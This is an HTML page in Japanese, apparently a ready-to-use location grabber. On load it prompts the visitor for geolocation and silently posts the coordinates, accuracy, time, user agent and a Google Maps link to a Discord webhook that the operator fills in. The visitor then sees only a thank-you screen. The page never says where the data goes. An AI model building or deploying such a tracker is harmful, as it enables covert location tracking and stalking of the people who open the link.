<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>位置情報確認ツール</title>
  <style>
    body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 50px; }
    h1 { font-size: 2em; }
    button { font-size: 1.5em; padding: 15px 30px; margin: 20px; }
  </style>
</head>
<body>
  <h1>位置情報収集システム</h1>
  <p>位置情報を取得しています...</p>
  <button onclick="getLocation()">位置情報を許可</button>

  <script>
    const webhook = 'YOUR_DISCORD_WEBHOOK_URL_HERE'; // Discord Webhook URLをここに貼り付け

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendPosition, showError);
      } else {
        alert("このブラウザは位置情報に対応していません");
      }
    }

    function sendPosition(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const acc = position.coords.accuracy;
      const timestamp = new Date(position.timestamp).toLocaleString();

      const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;

      const data = `
**位置情報取得成功**
緯度: ${lat}
経度: ${lon}
精度: ±${acc}m
時間: ${timestamp}
User-Agent: ${navigator.userAgent}
Google Maps: ${mapsUrl}
      `;

      fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: data })
      });

      document.body.innerHTML = '<h1>位置情報を取得しました。ありがとう！</h1>';
    }

    function showError(error) {
      let msg;
      switch(error.code) {
        case error.PERMISSION_DENIED: msg = "位置情報の許可が拒否されました"; break;
        case error.POSITION_UNAVAILABLE: msg = "位置情報が取得できません"; break;
        case error.TIMEOUT: msg = "タイムアウト"; break;
        default: msg = "不明なエラー"; break;
      }
      document.body.innerHTML += `<p>${msg}</p>`;
    }

    // ページロード時に自動で許可プロンプト表示
    window.onload = getLocation;
  </script>
</body>
</html>
